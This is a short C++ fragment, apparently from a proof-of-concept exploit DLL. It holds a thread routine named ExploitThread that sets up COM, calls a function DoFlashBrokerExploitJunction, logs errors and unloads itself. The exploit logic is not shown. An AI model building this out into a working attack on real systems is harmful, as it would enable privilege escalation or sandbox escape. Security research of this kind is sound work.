DWORD CALLBACK ExploitThread(LPVOID hModule)
{
    CoInitialize(nullptr);

    try
    {
        DoFlashBrokerExploitJunction();
    }
    catch (_com_error& e)
    {
        DebugPrintf("Error: %ls\n", e.ErrorMessage());
    }

    CoUninitialize();

    FreeLibraryAndExitThread((HMODULE)hModule, 0);
}